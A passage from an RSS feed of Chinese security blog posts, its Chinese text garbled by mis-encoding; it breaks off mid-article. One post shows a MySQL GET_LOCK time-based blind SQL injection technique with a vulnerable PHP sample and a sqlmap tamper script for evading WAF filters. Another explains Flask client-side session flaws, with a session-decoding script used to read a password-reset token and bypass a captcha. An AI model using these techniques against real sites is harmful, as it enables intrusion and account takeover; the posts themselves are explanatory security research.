·çš„æ–¹æ³•å¯ä»¥çŒœæµ‹å‡ºæƒé™èŒƒå›´å†…æ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ä¸­å­˜æ”¾çš„å†…å®¹ã€‚&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å…³äºmysqlæ—¶é—´ç±»å‹ï¼ˆtime-basedï¼‰çš„æ³¨å…¥ï¼Œä¸€ç›´ä»¥æ¥ä¼—æ‰€å‘¨çŸ¥çš„æœ‰ä¸‰ç§æ–¹æ³•â€”â€”sleepã€benchmarkã€ç¬›å¡å°”ç§¯ã€‚æ‰€ä»¥è®¸å¤šå¸‚é¢ä¸Šçš„WAFäº§å“ä¹Ÿæ˜¯åŸºäºæ­¤ç±»è§„åˆ™å»é˜²æŠ¤çš„ã€‚&lt;/p&gt;&lt;p&gt;ä½†æ˜¯sqlæ—¶é—´ç±»å‹çš„ç›²æ³¨æœ¬è´¨æ˜¯&lt;b&gt;åˆ©ç”¨æ’å…¥çš„SQLè¯­å¥æ‰§è¡Œé€ æˆæ—¶é—´å»¶è¿Ÿ&lt;/b&gt;ï¼Œæ‰€ä»¥åªè¦å¯ä»¥å¤§äºå¹³å‡ç½‘ç»œå»¶è¿Ÿ2å€ä»¥ä¸Šï¼Œå°±å¯ä»¥ä½œä¸ºæ‰§è¡ŒæˆåŠŸçš„åˆ¤æ–­ä¾æ®ï¼Œè€Œå¤§å¤šæ•°ç½‘ç«™çš„å¹³å‡å“åº”æ—¶é—´åœ¨100msä»¥å†…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ¶é€ èƒ½è¾¾åˆ°200msä»¥ä¸Šçš„æ—¶é—´å»¶é•¿çš„è¯­å¥ã€‚&lt;/p&gt;&lt;p&gt;ä»Šå¤©æˆ‘ä»¬è¦æåˆ°çš„ä¸€ä¸ªmysqlå‡½æ•°æ˜¯ get_lockå‡½æ•°ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹mysqlæ–‡æ¡£ä¸­å¯¹å…¶çš„æè¿°ï¼š&lt;/p&gt;&lt;p&gt;GET_LOCK(str,timeout)&lt;/p&gt;&lt;p&gt;Tries&lt;br&gt;to obtain a lock with a name given by the string str, using a timeout of&lt;br&gt;timeout seconds. A negative timeout value means infinite timeout. The lock is&lt;br&gt;exclusive. While held by one session, other sessions cannot obtain a lock of&lt;br&gt;the same name.&lt;/p&gt;&lt;p&gt;åœ¨ä¸€ä¸ªsessionä¸­å¯ä»¥å…ˆé”å®šä¸€ä¸ªå˜é‡ä¾‹å¦‚ï¼šselect get_lock(â€˜do9gyâ€™,1)&lt;/p&gt;&lt;p&gt;ç„¶åé€šè¿‡å¦ä¸€ä¸ªsession å†æ¬¡æ‰§è¡Œget_lockå‡½æ•° select get_lock(â€˜do9gyâ€™,5),æ­¤æ—¶ä¼šäº§ç”Ÿ5 ç§’çš„å»¶è¿Ÿï¼Œå…¶æ•ˆæœç±»ä¼¼äºsleep(5)ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; select get_lock(&#39;do9gy&#39;,1);
+---------------------+
| get_lock(&#39;do9gy&#39;,1) |
+---------------------+
|                   1 |
+---------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select get_lock(&#39;do9gy&#39;,5);
+---------------------+
| get_lock(&#39;do9gy&#39;,5) |
+---------------------+
|                   0 |
+---------------------+
1 row in set (5.00 sec)
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;äºæ˜¯æˆ‘ä»¬å¯ä»¥ï¼Œå°†æ­¤æ–¹æ³•ç”¨äºSQLæ³¨å…¥çš„åˆ¤æ–­ï¼Œä½†æ˜¯åˆ©ç”¨åœºæ™¯æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼šéœ€è¦æä¾›é•¿è¿æ¥ã€‚åœ¨Apache+PHPæ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨ mysql_pconnectå‡½æ•°æ¥è¿æ¥æ•°æ®åº“ã€‚&lt;/p&gt;&lt;p&gt;ä¸‹é¢æˆ‘ä»¬ç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
require &#39;conn.php&#39;;
$id = $_GET[&#39;id&#39;];
if(preg_match(&quot;/(sleep|benchmark|outfile|dumpfile|load_file|join)/i&quot;, $_GET[&#39;id&#39;]))
{
    die(&quot;403 forbidden!&quot;);
}
$sql = &quot;select * from article where id=&#39;&quot;.intval($id).&quot;&#39;&quot;;
$res = mysql_query($sql);
if(!$res){
    die(&quot;404 not found!&quot;);
}
$row = mysql_fetch_array($res, MYSQL_ASSOC);
print_r($row);
mysql_query(&quot;update view set view_times=view_times+1 where id = &#39;&quot;.$id.&quot; &#39;&quot;);
?&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;è¯¥æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ SQLè¯­å¥ ?id=1&lt;br&gt;and get_lock(â€˜do9gyâ€™,1)&lt;/p&gt;&lt;p&gt;æ³¨æ„ï¼šç”±äºget_lockéœ€è¦å˜æ¢sessionè¯·æ±‚ï¼Œæ‰€ä»¥å½“æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡ä»¥åéœ€è¦åœæ»ä¸€æ®µæ—¶é—´ï¼ˆåŠåˆ†é’Ÿå·¦å³ï¼‰ï¼Œè®©Apacheé‡æ–°æ‰“å¼€ä¸€ä¸ªè¿æ¥mysqlçš„s&lt;/p&gt;&lt;p&gt;essionï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨get_lockè¿›è¡Œæ¢æµ‹äº†ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªåŸºäºsqlmapçš„tamperï¼š&lt;/p&gt;&lt;p&gt;&lt;b&gt;sleeptogetlock.py&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;#!/usr/bin/env python

&quot;&quot;&quot;
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file &#39;doc/COPYING&#39; for copying permission
&quot;&quot;&quot;

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces instances like &#39;SLEEP(A)&#39; with &quot;get_lock(&#39;do9gy&#39;,A)&quot;

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0 and 5.5

    Notes:
        * Useful to bypass very weak and bespoke web application firewalls
          that filter the SLEEP() and BENCHMARK() functions

    &amp;gt;&amp;gt;&amp;gt; tamper(&#39;SLEEP(2)&#39;)
    &quot;get_lock(&#39;do9gy&#39;,2)&quot;
    &quot;&quot;&quot;

    if payload and payload.find(&quot;SLEEP&quot;) &amp;gt; -1:
        while payload.find(&quot;SLEEP(&quot;) &amp;gt; -1:
            index = payload.find(&quot;SLEEP(&quot;)
            depth = 1
            
            num = payload[index+6]

            
            newVal = &quot;get_lock(&#39;do9gy&#39;,%s)&quot; % (num)
            payload = payload[:index] + newVal + payload[index+8:]


    return payload
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å½“é‡åˆ°ç½‘ç«™è¿‡æ»¤å•å¼•å·çš„æƒ…å†µä¹Ÿå¯ä»¥ä½¿ç”¨ get_lock(1,1) é”å®šæ•°å­—å˜é‡ç»•è¿‡ã€‚&lt;/p&gt;&lt;p&gt;æœ€åï¼Œæƒ³å£°æ˜çš„æ˜¯æœ¬æ–¹æ³•åªæ˜¯ç¬”è€…ä¾æ®æ—¶é—´æ³¨å…¥æœ¬è´¨åŸç†è¿›è¡Œçš„ä¸€æ¬¡æ¢ç´¢ï¼Œç°å®ç¯å¢ƒä¸­ä¸ä¸€å®šæœ‰å¤§é‡åˆé€‚çš„ç¯å¢ƒï¼Œæœ€é‡è¦çš„æ˜¯ä¿æŒä¸€é¢—ä¸æ–­çªç ´ç“¶é¢ˆï¼ŒæŠ±æœ‰å¹»æƒ³å’Œå¸Œæœ›çš„å¿ƒã€‚å¦‚æœ‰ä¸å®ä¹‹å¤„è¿˜æœ›è¯¸å›æ–§æ­£ã€‚&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-04-03-35245598</guid>
<pubDate>Tue, 03 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34936378&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-21b43848c8b14cf9e50e965b48ef5281_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;åœ¨Webä¸­ï¼Œsessionæ˜¯è®¤è¯ç”¨æˆ·èº«ä»½çš„å‡­è¯ï¼Œå®ƒå…·å¤‡å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ç”¨æˆ·ä¸å¯ä»¥ä»»æ„ç¯¡æ”¹&lt;/li&gt;&lt;li&gt;Aç”¨æˆ·çš„sessionæ— æ³•è¢«Bç”¨æˆ·è·å–&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´ï¼Œsessionçš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†åšç”¨æˆ·èº«ä»½è®¤è¯ã€‚ä½†æ˜¯ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ï¼Œsessionè¢«ç”¨ä½œäº†åˆ«çš„ç”¨é€”ï¼Œå°†äº§ç”Ÿä¸€äº›å®‰å…¨é—®é¢˜ï¼Œæˆ‘ä»¬ä»Šå¤©å°±æ¥è°ˆè°ˆâ€œå®¢æˆ·ç«¯sessionâ€ï¼ˆclient sessionï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;0x01 ä»€ä¹ˆæ˜¯å®¢æˆ·ç«¯session&lt;/h2&gt;&lt;p&gt;åœ¨ä¼ ç»ŸPHPå¼€å‘ä¸­ï¼Œ&lt;code class=&quot;inline&quot;&gt;$_SESSION&lt;/code&gt;å˜é‡çš„å†…å®¹é»˜è®¤ä¼šè¢«ä¿å­˜åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé€šè¿‡ä¸€ä¸ªå«â€œPHPSESSIDâ€çš„Cookieæ¥åŒºåˆ†ç”¨æˆ·ã€‚è¿™ç±»sessionæ˜¯â€œæœåŠ¡ç«¯sessionâ€ï¼Œç”¨æˆ·çœ‹åˆ°çš„åªæ˜¯sessionçš„åç§°ï¼ˆä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼‰ï¼Œå…¶å†…å®¹ä¿å­˜åœ¨æœåŠ¡ç«¯ã€‚&lt;/p&gt;&lt;p&gt;ç„¶è€Œï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è¯­è¨€éƒ½æœ‰é»˜è®¤çš„sessionå­˜å‚¨æœºåˆ¶ï¼Œä¹Ÿä¸æ˜¯ä»»ä½•æƒ…å†µä¸‹æˆ‘ä»¬éƒ½å¯ä»¥å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œå¾ˆå¤šWebæ¡†æ¶éƒ½ä¼šå¦è¾Ÿè¹Šå¾„ï¼Œæ¯”å¦‚Djangoé»˜è®¤å°†sessionå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œè€Œå¯¹äºflaskè¿™é‡Œå¹¶ä¸åŒ…å«æ•°æ®åº“æ“ä½œçš„æ¡†æ¶ï¼Œå°±åªèƒ½å°†sessionå­˜å‚¨åœ¨cookieä¸­ã€‚&lt;/p&gt;&lt;p&gt;å› ä¸ºcookieå®é™…ä¸Šæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¸­çš„ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºâ€œå®¢æˆ·ç«¯sessionâ€ã€‚&lt;/p&gt;&lt;h2&gt;0x02 ä¿æŠ¤å®¢æˆ·ç«¯session&lt;/h2&gt;&lt;p&gt;å°†sessionå­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­ï¼Œæœ€é‡è¦çš„å°±æ˜¯è§£å†³sessionä¸èƒ½è¢«ç¯¡æ”¹çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬çœ‹çœ‹flaskæ˜¯å¦‚ä½•å¤„ç†çš„ï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SecureCookieSessionInterface(SessionInterface):
    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
    through the :mod:`itsdangerous` module.
    &quot;&quot;&quot;
    #: the salt that should be applied on top of the secret key for the
    #: signing of cookie based sessions.
    salt = &#39;cookie-session&#39;
    #: the hash function to use for the signature. The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    #: the name of the itsdangerous supported key derivation. The default
    #: is hmac.
    key_derivation = &#39;hmac&#39;
    #: A python serializer for the payload. The default is a compact
    #: JSON derived serializer with support for some extra Python types
    #: such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)
        # Delete case. If there is no session we bail early.
        # If the session was modified to be empty we remove the
        # whole cookie.
        if not session:
            if session.modified:
                response.delete_cookie(app.session_cookie_name,
                                       domain=domain, path=path)
            return
        # Modification case. There are upsides and downsides to
        # emitting a set-cookie header each request. The behavior
        # is controlled by the :meth:`should_set_cookie` method
        # which performs a quick check to figure out if the cookie
        # should be set or not. This is controlled by the
        # SESSION_REFRESH_EACH_REQUEST config flag as well as
        # the permanent flag on the session itself.
        if not self.should_set_cookie(app, session):
            return
        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        expires = self.get_expiration_time(app, session)
        val = self.get_signing_serializer(app).dumps(dict(session))
        response.set_cookie(app.session_cookie_name, val,
                            expires=expires, httponly=httponly,
                            domain=domain, path=path, secure=secure)&lt;/code&gt;&lt;p&gt;ä¸»è¦çœ‹æœ€åä¸¤è¡Œä»£ç ï¼Œæ–°å»ºäº†&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;ç±» ï¼Œç”¨å®ƒçš„&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;æ–¹æ³•å°†ç±»å‹ä¸ºå­—å…¸çš„sessionå¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åç”¨&lt;code class=&quot;inline&quot;&gt;response.set_cookie&lt;/code&gt;å°†æœ€åçš„å†…å®¹ä¿å­˜åœ¨cookieä¸­ã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;æ˜¯åšä»€ä¹ˆçš„ï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class Signer(object):
    # â€¦
    def sign(self, value):
        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # â€¦.
    def dumps(self, obj, salt=None):
        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        &quot;&quot;&quot;
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode(&#39;utf-8&#39;)
        return rv

    def dump_payload(self, obj):
        &quot;&quot;&quot;Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        &quot;&quot;&quot;
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    &quot;&quot;&quot;
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b&#39;.&#39;):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;
                &#39;an exception&#39;, original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;
                    &#39;decoding the payload&#39;, original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    def dump_payload(self, obj):
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        compressed = zlib.compress(json)
        if len(compressed) &amp;lt; (len(json) - 1):
            json = compressed
            is_compressed = True
        base64d = base64_encode(json)
        if is_compressed:
            base64d = b&#39;.&#39; + base64d
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``&#39;_&#39;``, ``&#39;-&#39;`` and ``&#39;.&#39;``.
    &quot;&quot;&quot;
    default_serializer = compact_json&lt;/code&gt;&lt;p&gt;ä¸»è¦å…³æ³¨&lt;code class=&quot;inline&quot;&gt;dump_payload&lt;/code&gt;ã€&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;ï¼Œè¿™æ˜¯åºåˆ—åŒ–sessionçš„ä¸»è¦è¿‡ç¨‹ã€‚&lt;/p&gt;&lt;p&gt;å¯è§ï¼Œåºåˆ—åŒ–çš„æ“ä½œåˆ†å¦‚ä¸‹å‡ æ­¥ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;json.dumps å°†å¯¹è±¡è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºæ•°æ®&lt;/li&gt;&lt;li&gt;å¦‚æœæ•°æ®å‹ç¼©åé•¿åº¦æ›´çŸ­ï¼Œåˆ™ç”¨zlibåº“è¿›è¡Œå‹ç¼©&lt;/li&gt;&lt;li&gt;å°†æ•°æ®ç”¨base64ç¼–ç &lt;/li&gt;&lt;li&gt;é€šè¿‡hmacç®—æ³•è®¡ç®—æ•°æ®çš„ç­¾åï¼Œå°†ç­¾åé™„åœ¨æ•°æ®åï¼Œç”¨â€œ.â€åˆ†å‰²&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ç¬¬4æ­¥å°±è§£å†³äº†ç”¨æˆ·ç¯¡æ”¹sessionçš„é—®é¢˜ï¼Œå› ä¸ºåœ¨ä¸çŸ¥é“secret_keyçš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ã€‚&lt;/p&gt;&lt;p&gt;æœ€åï¼Œæˆ‘ä»¬åœ¨cookieä¸­å°±èƒ½çœ‹åˆ°è®¾ç½®å¥½çš„sessionäº†ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-310bda7796d4d07ae78abb4813d76b6a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;295&quot;&gt;&lt;p&gt;æ³¨æ„åˆ°ï¼Œåœ¨ç¬¬4æ­¥ä¸­ï¼Œflaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;0x03 flaskå®¢æˆ·ç«¯sessionå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²&lt;/h2&gt;&lt;p&gt;æˆ‘æ›¾é‡åˆ°è¿‡ä¸€ä¸ªæ¡ˆä¾‹ï¼Œç›®æ ‡æ˜¯flaskå¼€å‘çš„ä¸€ä¸ªç®€å†ç®¡ç†ç³»ç»Ÿï¼Œåœ¨æµ‹è¯•å…¶æ‰¾å›å¯†ç åŠŸèƒ½çš„æ—¶å€™ï¼Œæˆ‘æ”¶åˆ°äº†æœåŠ¡ç«¯è®¾ç½®çš„sessionã€‚&lt;/p&gt;&lt;p&gt;æˆ‘åœ¨0x02ä¸­è¯´è¿‡ï¼Œflaskæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯sessionï¼Œæ‰€ä»¥çœ‹ç›®æ ‡ä¸ºflaskçš„ç«™ç‚¹çš„æ—¶å€™ï¼Œæˆ‘ä¹ æƒ¯æ€§åœ°å»è§£å¯†å…¶sessionã€‚ç¼–å†™å¦‚ä¸‹ä»£ç è§£å¯†sessionï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)

    decompress = False
    if payload.startswith(b&#39;.&#39;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ == &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))&lt;/code&gt;&lt;p&gt;ä¾‹å¦‚ï¼Œæˆ‘è§£å¯†0x02ä¸­æ¼”ç¤ºçš„sessionï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-429c5066ae1eecc810a94c75d231d665_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;723&quot; data-rawheight=&quot;41&quot;&gt;&lt;p&gt;é€šè¿‡è§£å¯†ç›®æ ‡ç«™ç‚¹çš„sessionï¼Œæˆ‘å‘ç°å…¶è®¾ç½®äº†ä¸€ä¸ªåä¸ºtokenã€å€¼æ˜¯ä¸€ä¸²md5çš„é”®ã€‚çŒœæµ‹å…¶ä¸ºæ‰¾å›å¯†ç çš„è®¤è¯ï¼Œå°†å…¶æ›¿æ¢åˆ°æ‰¾å›å¯†ç é“¾æ¥çš„tokenä¸­ï¼Œæœç„¶èƒ½å¤Ÿè¿›å…¥ä¿®æ”¹å¯†ç é¡µé¢ã€‚é€šè¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘å°±èƒ½ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç äº†ã€‚&lt;/p&gt;&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå…¸å‹çš„å®‰å…¨é—®é¢˜ï¼Œç›®æ ‡ç½‘ç«™é€šè¿‡sessionæ¥å‚¨å­˜éšæœºtokenå¹¶è®¤è¯ç”¨æˆ·æ˜¯å¦çœŸçš„åœ¨é‚®ç®±æ”¶åˆ°äº†è¿™ä¸ªtokenã€‚ä½†å› ä¸ºflaskçš„sessionæ˜¯å­˜å‚¨åœ¨cookieä¸­ä¸”ä»…ç­¾åè€ŒæœªåŠ å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è¯»å–è¿™ä¸ªtokenäº†ã€‚&lt;/p&gt;&lt;h2&gt;0x04 flaskéªŒè¯ç ç»•è¿‡æ¼æ´&lt;/h2&gt;&lt;p&gt;è¿™æ˜¯å®¢æˆ·ç«¯sessionçš„å¦ä¸€ä¸ªå¸¸è§æ¼æ´åœºæ™¯ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬ç”¨ä¸€ä¸ªå®é™…ä¾‹å­è®¤è¯†è¿™ä¸€ç‚¹ï¼š&lt;a href=&quot;https://github.com/shonenada/flask-captcha&quot;&gt;https://github.com/shonenada/flask-captcha&lt;/a&gt; ã€‚è¿™æ˜¯ä¸€ä¸ªä¸ºflaskæä¾›éªŒè¯ç çš„é¡¹ç›®ï¼Œæˆ‘ä»¬çœ‹åˆ°å…¶ä¸­çš„viewæ–‡ä»¶ï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp


captcha_bp = Blueprint(&#39;captcha&#39;, __name__)


def sample_chars():
    characters = current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]
    char_length = current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route(&#39;/captcha&#39;, endpoint=&quot;captcha&quot;)
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config[&#39;CAPTCHA_FONTS&#39;],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = &#39;&#39;.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    session[&#39;captcha&#39;] = captcha_code
    imgfile.save(out, &#39;PNG&#39;)
    out.seek(0)
    response = make_response(out.read())
    response.content_type = &#39;image/png&#39;
    return response&lt;/code&gt;&lt;p&gt;å¯è§ï¼Œå…¶ç”ŸæˆéªŒè¯ç åï¼Œå°±å­˜å‚¨åœ¨sessionä¸­äº†ï¼š&lt;code class=&quot;inline&quot;&gt;session[&#39;captcha&#39;] = captcha_code&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬ç”¨æµè§ˆå™¨è®¿é—®&lt;code class=&quot;inline&quot;&gt;/captcha&lt;/code&gt;ï¼Œå³å¯å¾—åˆ°ç”Ÿæˆå¥½çš„éªŒè¯ç å›¾ç‰‡ï¼Œæ­¤æ—¶å¤åˆ¶ä¿å­˜åœ¨cookieä¸­çš„sessionå€¼ï¼Œç”¨0x03ä¸­æä¾›çš„è„šæœ¬è¿›è¡Œè§£ç ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b6399058172ffe4b393e6da2df5bb9bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1496&quot; data-rawheight=&quot;697&quot;&gt;&lt;p&gt;å¯è§ï¼Œæˆ‘æˆåŠŸè·å–äº†éªŒè¯ç çš„å€¼ï¼Œè¿›è€Œå¯ä»¥ç»•è¿‡éªŒè¯ç çš„åˆ¤æ–­ã€‚&lt;/p&gt;&lt;p&gt;è¿™ä¹Ÿæ˜¯å®¢æˆ·ç«¯sessionçš„ä¸€ç§é”™è¯¯ä½¿ç”¨æ–¹æ³•ã€‚&lt;/p&gt;&lt;h2&gt;0x05 CodeIgniter 2.1.4 sessionä¼ªé€ åŠå¯¹è±¡æ³¨å…¥æ¼æ´&lt;/h2&gt;&lt;p&gt;Codeigniter 2çš„sessionä¹Ÿå‚¨å­˜åœ¨sessionä¸­ï¼Œé»˜è®¤åä¸º&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;ï¼Œé»˜è®¤å€¼å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e5edf0893d4da488de1ace08380c8635_r.jpg&quot; data-caption=&quot;&quot; 